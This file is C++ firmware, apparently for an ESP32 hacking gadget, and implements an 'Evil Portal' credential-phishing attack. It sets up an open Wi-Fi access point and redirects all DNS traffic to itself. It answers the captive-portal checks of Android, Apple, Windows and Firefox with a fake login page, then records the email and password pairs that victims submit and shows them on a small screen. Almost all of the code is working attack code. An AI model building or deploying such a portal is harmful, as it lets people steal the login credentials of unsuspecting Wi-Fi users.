#pragma once

#include "globals.h"
#include "evil_portal_html.h"
#include <WebServer.h>
#include <DNSServer.h>

// ============================================================
// Evil Portal — static instances (no new/delete = no crash)
// ============================================================

static WebServer portalServer(80);
static DNSServer portalDns;
static bool evilPortalRunning = false;
static IPAddress portalIP(172, 0, 0, 1);

// Serve login page
void handlePortalRoot() {
  portalServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  portalServer.sendHeader("Pragma", "no-cache");
  portalServer.send(200, "text/html", EVIL_PORTAL_HTML);
}

// Capture credentials via POST
void handlePortalPost() {
  String email = portalServer.arg("email");
  String password = portalServer.arg("password");

  if (email.length() > 0 && password.length() > 0) {
    Serial.printf("[Portal] GOT: %s / %s\n", email.c_str(), password.c_str());
    if (credCount < EVIL_PORTAL_MAX_CREDS) {
      capturedCreds[credCount].email = email;
      capturedCreds[credCount].password = password;
      capturedCreds[credCount].capturedAt = millis();
      credCount++;
      newCredCaptured = true;
      displayNeedsUpdate = true;
    }
  }

  // Redirect back to login page
  portalServer.sendHeader("Location", "http://172.0.0.1/");
  portalServer.send(302, "text/html", "");
}

// Android captive portal detection — return redirect (not 204)
void handleCaptiveRedirect() {
  portalServer.sendHeader("Location", "http://172.0.0.1/");
  portalServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  portalServer.send(302, "text/html", "");
}

// Apple captive portal — serve login page directly (not "Success")
void handleAppleCaptive() {
  portalServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  portalServer.send(200, "text/html", EVIL_PORTAL_HTML);
}

// Start evil portal
void startEvilPortal() {
  if (evilPortalRunning) return;

  credCount = 0;
  credMenuIndex = 0;
  newCredCaptured = false;

  // Full WiFi reset
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(200);
  WiFi.mode(WIFI_AP);
  delay(200);

  // Configure AP
  IPAddress subnet(255, 255, 255, 0);
  WiFi.softAPConfig(portalIP, portalIP, subnet);
  WiFi.softAP(EVIL_PORTAL_SSID, "", 1, 0, 8);
  delay(500);

  Serial.printf("[Portal] AP: %s IP: %s\n", EVIL_PORTAL_SSID, WiFi.softAPIP().toString().c_str());

  // DNS: redirect ALL domains to our IP
  portalDns.setErrorReplyCode(DNSReplyCode::NoError);
  portalDns.start(53, "*", portalIP);

  // Routes
  portalServer.on("/", HTTP_GET, handlePortalRoot);
  portalServer.on("/", HTTP_POST, handlePortalPost);
  portalServer.on("/post", HTTP_GET, handlePortalPost);
  portalServer.on("/post", HTTP_POST, handlePortalPost);

  // Android
  portalServer.on("/generate_204", HTTP_GET, handleCaptiveRedirect);
  portalServer.on("/gen_204", HTTP_GET, handleCaptiveRedirect);
  portalServer.on("/mobile/status.php", HTTP_GET, handleCaptiveRedirect);
  portalServer.on("/connectivity-check.html", HTTP_GET, handleCaptiveRedirect);

  // Apple
  portalServer.on("/hotspot-detect.html", HTTP_GET, handleAppleCaptive);
  portalServer.on("/library/test/success.html", HTTP_GET, handleAppleCaptive);
  portalServer.on("/success.txt", HTTP_GET, handleAppleCaptive);

  // Windows
  portalServer.on("/ncsi.txt", HTTP_GET, handleCaptiveRedirect);
  portalServer.on("/connecttest.txt", HTTP_GET, handleCaptiveRedirect);
  portalServer.on("/redirect", HTTP_GET, handleCaptiveRedirect);
  portalServer.on("/fwlink", HTTP_GET, handleCaptiveRedirect);

  // Firefox
  portalServer.on("/canonical.html", HTTP_GET, handleCaptiveRedirect);

  // Catch-all
  portalServer.onNotFound(handleCaptiveRedirect);

  portalServer.begin();
  evilPortalRunning = true;

  Serial.println("[Portal] Started");
}

// Stop evil portal
void stopEvilPortal() {
  if (!evilPortalRunning) return;

  portalServer.stop();
  portalServer.close();
  portalDns.stop();

  evilPortalRunning = false;

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("GhostWave", "", 1, 1);
  WiFi.disconnect();
  delay(200);
  Serial.println("[Portal] Stopped");
}

// Process (call from loop)
void processEvilPortal() {
  if (!evilPortalRunning) return;
  portalDns.processNextRequest();
  portalServer.handleClient();
  yield();  // prevent watchdog reset
}

// Draw OLED screen
void drawEvilPortalScreen() {
  display.clearDisplay();
  display.fillRect(0, 0, 128, 10, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.setCursor(2, 1);
  display.print("Evil Portal");
  display.setTextColor(SSD1306_WHITE);

  display.setCursor(0, 13);
  display.print("AP: ");
  display.print(EVIL_PORTAL_SSID);

  display.setCursor(0, 22);
  display.print("Clients: ");
  display.print(WiFi.softAPgetStationNum());
  display.print("  Creds: ");
  display.print(credCount);

  if (credCount > 0) {
    display.drawFastHLine(0, 31, 128, SSD1306_WHITE);
    int idx = credCount - 1;

    if (newCredCaptured && ((millis() / 400) % 2 == 0)) {
      display.setCursor(100, 33); display.print("NEW!");
    }

    display.setCursor(0, 33);
    display.print("E:");
    String email = capturedCreds[idx].email;
    if (email.length() > 19) email = email.substring(0, 19);
    display.print(email);

    display.setCursor(0, 43);
    display.print("P:");
    String pass = capturedCreds[idx].password;
    if (pass.length() > 19) pass = pass.substring(0, 19);
    display.print(pass);

    if (newCredCaptured && millis() - capturedCreds[idx].capturedAt > 5000)
      newCredCaptured = false;
  } else {
    display.setCursor(10, 36);
    display.print("Waiting for creds..");
  }

  display.drawFastHLine(0, 53, 128, SSD1306_WHITE);
  display.setCursor(15, 55);
  display.print("BACK = STOP");
  display.display();
}
